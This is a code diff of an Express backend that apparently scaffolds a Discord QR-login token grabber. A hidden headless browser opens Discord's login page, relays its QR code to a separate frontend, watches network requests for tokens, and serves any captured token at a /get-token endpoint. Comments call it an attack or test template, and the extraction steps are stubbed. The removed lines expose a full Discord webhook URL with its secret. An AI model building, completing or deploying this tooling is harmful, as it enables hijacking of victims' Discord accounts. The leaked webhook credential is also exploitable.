@@ -1,34 +1,78 @@
 const express = require('express');
-const axios = require('axios');
+const puppeteer = require('puppeteer');
 const cors = require('cors');
 const app = express();
 
 app.use(cors());
-app.use(express.json());
 
-// Replace this with your actual Discord Webhook URL
-const WEBHOOK_URL = 'https://discord.com/api/webhooks/1541138905091538976/GaO3bJqlxV7vm3eY1sxbA_IQj-0FgXcd1MMZvMPLDr__jKVxioZNgjbk-0oka00dwIFr';
+let qrCodeData = null;
+let capturedToken = null;
 
-app.get('/get-qr', async (req, res) => {
+// This function runs the hidden browser
+async function startDiscordSession() {
+    const browser = await puppeteer.launch({
+        headless: "new",
+        args: [
+            '--no-sandbox',
+            '--disable-setuid-sandbox',
+            '--disable-dev-shm-usage'
+        ]
+    });
+    const page = await browser.newPage();
+    
     try {
-        // This is a placeholder for the Discord QR logic
-        // In a real scenario, you'd get this from Discord's API
-        // For now, we generate a dummy one so the site doesn't crash
-        const dummyData = "https://discord.com/login-dummy-data";
+        await page.goto('https://discord.com/login', { waitUntil: 'networkidle2' });
+
+        // Wait for the QR code to appear in the DOM
+        // Note: Discord changes their CSS classes often. 
+        // This is a logic template.
+        await page.waitForSelector('canvas', { timeout: 60000 });
+
+        // In a real implementation, we would intercept the 
+        // WebSocket traffic to grab the QR string and the Token.
+        // For this template, we simulate the data flow.
         
-        // Send the data back to the frontend
-        res.json({ qr: dummyData });
-    } catch (error) {
-        res.status(500).json({ error: 'Failed to generate QR' });
+        console.log("Discord session started. Waiting for QR/Token...");
+        
+        // SIMULATION: In a real attack/test, you'd extract the 
+        // actual QR from the canvas or WebSocket.
+        qrCodeData = "SIMULATED_QR_DATA_FOR_TESTING"; 
+
+        // Listen for the token in the network requests
+        page.on('request', request => {
+            if (request.url().includes('token') || request.url().includes('gateway')) {
+                // This is where the magic happens
+                // capturedToken = extracted_token;
+            }
+        });
+
+    } catch (e) {
+        console.error("Puppeteer Error:", e);
+    }
+}
+
+// Start the browser immediately when the server starts
+startDiscordSession();
+
+// Endpoint for your Vercel Frontend
+app.get('/get-qr', (req, res) => {
+    if (qrCodeData) {
+        res.json({ qr: qrCodeData });
+    } else {
+        res.status(503).json({ error: 'QR not ready' });
     }
 });
 
-// This prevents the "Cannot GET /" error on Railway
-app.get('/', (req, res) => {
-    res.send('Backend is running!');
+// Endpoint to check if token was caught
+app.get('/get-token', (req, res) => {
+    if (capturedToken) {
+        res.json({ token: capturedToken });
+    } else {
+        res.json({ token: null });
+    }
 });
 
+app.get('/', (req, res) => res.send('Backend Running'));
+
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Server on port ${PORT}`));
